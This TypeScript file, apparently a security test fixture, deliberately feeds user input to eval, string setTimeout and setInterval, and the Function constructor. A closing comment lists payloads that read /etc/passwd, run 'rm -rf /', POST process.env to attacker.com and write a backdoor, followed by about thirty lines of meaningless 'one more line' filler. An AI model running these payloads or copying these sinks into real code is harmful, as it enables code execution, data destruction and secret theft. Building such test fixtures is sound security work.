// TypeScript code with Remote Code Execution vulnerabilities
// WARNING: This code contains intentional security vulnerabilities for testing purposes

interface UserRequest {
  expression: string;
  delay: number;
  callback: string;
  formula: string;
}

class VulnerableCalculator {
  
  // Vulnerability 1: Direct eval() usage
  calculateExpression(userInput: string): number {
    console.log(`Evaluating: ${userInput}`);
    // VULNERABLE: Direct eval of user input
    return eval(userInput);
  }


  calculateExpression2(userInput: string): number {
    console.log(`Evaluating: ${userInput}`);
    // VULNERABLE: Direct eval of user input
    return eval(userInput);
  }

  // Vulnerability 2: setTimeout with string parameter
  scheduleTask(userCode: string, delay: number): void {
    console.log(`Scheduling task: ${userCode}`);
    // VULNERABLE: setTimeout with string executes code
    setTimeout(userCode, delay);
  }

  // Vulnerability 3: setInterval with string parameter
  createRepeatingTask(userCode: string, interval: number): number {
    console.log(`Creating repeating task: ${userCode}`);
    // VULNERABLE: setInterval with string executes code
    return setInterval(userCode, interval);
  }

  // Vulnerability 4: Function constructor
  createDynamicFunction(userCode: string): Function {
    console.log(`Creating function: ${userCode}`);
    // VULNERABLE: Function constructor with user input
    return new Function(userCode);
  }

  // Vulnerability 5: Indirect eval through window object (if in browser)
  indirectEval(userInput: string): any {
    console.log(`Indirect eval: ${userInput}`);
    // VULNERABLE: Indirect eval
    const evaluator = eval;
    return evaluator(userInput);
  }
}

// API endpoint simulation
class VulnerableAPI {
  
  processUserRequest(request: UserRequest): any {
    const calc = new VulnerableCalculator();
    
    // Multiple vulnerability entry points
    const result = calc.calculateExpression(request.expression);
    
    if (request.callback) {
      calc.scheduleTask(request.callback, request.delay);
    }
    
    if (request.formula) {
      const dynamicFunc = calc.createDynamicFunction(request.formula);
      dynamicFunc();
    }
    
    return result;
  }
}

// Example usage that would be exploitable
class ExampleUsage {
  static demonstrateVulnerabilities(): void {
    const api = new VulnerableAPI();
    const calc = new VulnerableCalculator();
    
    // These would be dangerous with malicious input:
    
    // 1. Math expression (seems safe but eval is dangerous)
    console.log("=== Math Expression ===");
    const mathResult = calc.calculateExpression("2 + 3 * 4");
    console.log(`Result: ${mathResult}`);
    
    // 2. Scheduled code execution
    console.log("=== Scheduled Task ===");
    calc.scheduleTask("console.log('Scheduled task executed')", 1000);
    
    // 3. Function creation
    console.log("=== Dynamic Function ===");
    const dynamicFunc = calc.createDynamicFunction("return 'Hello from dynamic function'");
    console.log(dynamicFunc());
    
    // 4. API request processing
    console.log("=== API Request ===");
    const request: UserRequest = {
      expression: "Math.pow(2, 3)",
      delay: 500,
      callback: "console.log('Callback executed')",
      formula: "console.log('Dynamic formula executed')"
    };
    
    const apiResult = api.processUserRequest(request);
    console.log(`API Result: ${apiResult}`);
  }
}

// Malicious payloads that could be injected:
/*
Examples of dangerous inputs that would exploit these vulnerabilities:

1. For eval():
   - "require('fs').readFileSync('/etc/passwd', 'utf8')"
   - "process.exit(1)"
   - "global.maliciousCode = true"

2. For setTimeout/setInterval:
   - "require('child_process').exec('rm -rf /')"
   - "fetch('http://attacker.com/steal', {method: 'POST', body: JSON.stringify(process.env)})"

3. For Function constructor:
   - "require('fs').writeFileSync('/tmp/backdoor.js', 'malicious code')"
   - "return process.env"

These vulnerabilities allow attackers to:
- Execute arbitrary system commands
- Access file system
- Steal environment variables
- Crash the application
- Install backdoors
- Access sensitive data
- one more line here
- one more line here
- one more line here
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
- one more line
*/

// Export for testing
export { VulnerableCalculator, VulnerableAPI, ExampleUsage };
